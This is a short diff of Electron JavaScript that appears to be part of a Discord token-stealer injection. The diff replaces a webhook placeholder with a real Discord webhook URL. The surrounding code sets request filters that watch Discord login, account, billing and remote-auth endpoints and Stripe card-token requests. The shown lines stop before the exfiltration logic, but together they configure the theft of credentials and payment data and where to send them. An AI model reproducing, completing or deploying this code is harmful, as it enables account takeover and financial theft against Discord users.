@@ -4,7 +4,7 @@
 const { BrowserWindow, session } = require('electron');
 const fs = require('fs');
 const path = require('path');
-const webhook = "%WEBHOOK_LINK%"; // No put "/" at the end
+const webhook = "https://discord.com/api/webhooks/1101134123818553494/qiUEXduu-82tkPIkNtk7_O9ZwWN9Mi7Zfnq0m-yFXEMQDNlUakamMNjgHpraoAUqOvLn"; // No put "/" at the end
 const Filters = {
     1: {urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]},
     2: {urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]} 
